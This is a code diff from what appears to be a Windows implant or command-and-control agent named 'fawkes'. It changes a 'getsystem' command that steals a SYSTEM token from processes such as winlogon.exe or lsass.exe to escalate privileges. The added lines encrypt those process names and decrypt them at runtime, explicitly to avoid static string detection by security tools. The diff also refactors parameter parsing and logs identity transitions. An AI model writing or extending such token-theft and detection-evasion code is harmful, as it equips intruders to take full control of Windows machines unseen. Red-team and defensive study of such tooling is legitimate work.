@@ -4,11 +4,11 @@
 package commands
 
 import (
-	"encoding/json"
 	"fmt"
 	"strings"
 	"unsafe"
 
+	"fawkes/pkg/obfuscate"
 	"fawkes/pkg/structs"
 
 	"golang.org/x/sys/windows"
@@ -29,11 +29,9 @@ type getSystemArgs struct {
 }
 
 func (c *GetSystemCommand) Execute(task structs.Task) structs.CommandResult {
-	var args getSystemArgs
-	if task.Params != "" {
-		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return errorf("Failed to parse parameters: %v", err)
-		}
+	args, parseErr := unmarshalParams[getSystemArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	// Default to token stealing
@@ -138,6 +136,10 @@ func getSystemViaSteal(oldIdentity string) structs.CommandResult {
 		return errorf("Token stolen but failed to verify identity: %v", err)
 	}
 
+	// Record identity transition for history
+	RecordIdentityTransition("getsystem", oldIdentity, newIdentity,
+		fmt.Sprintf("steal from %s (PID %d)", processName, systemPID))
+
 	var sb strings.Builder
 	sb.WriteString("Successfully elevated to SYSTEM\n")
 	sb.WriteString(fmt.Sprintf("Technique: Token steal from %s (PID %d)\n", processName, systemPID))
@@ -156,7 +158,7 @@ func findSystemProcess() (uint32, string, error) {
 	// Take a snapshot of all processes
 	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
 	if err != nil {
-		return 0, "", fmt.Errorf("CreateToolhelp32Snapshot: %v", err)
+		return 0, "", fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
 	}
 	defer windows.CloseHandle(snapshot)
 
@@ -164,7 +166,12 @@ func findSystemProcess() (uint32, string, error) {
 	entry.Size = uint32(unsafe.Sizeof(entry))
 
 	// Preferred SYSTEM processes (in order of preference)
-	preferred := []string{"winlogon.exe", "lsass.exe", "services.exe", "svchost.exe"}
+	// Decrypt process names at runtime to avoid static string detection
+	winlogon := obfuscate.Winlogon()
+	defer obfuscate.Zero(winlogon)
+	lsass := obfuscate.Lsass()
+	defer obfuscate.Zero(lsass)
+	preferred := []string{winlogon, lsass, "services.exe", "svchost.exe"}
 	preferredMap := make(map[string]bool)
 	for _, p := range preferred {
 		preferredMap[p] = true
@@ -179,7 +186,7 @@ func findSystemProcess() (uint32, string, error) {
 
 	err = windows.Process32First(snapshot, &entry)
 	if err != nil {
-		return 0, "", fmt.Errorf("Process32First: %v", err)
+		return 0, "", fmt.Errorf("Process32First: %w", err)
 	}
 
 	for {
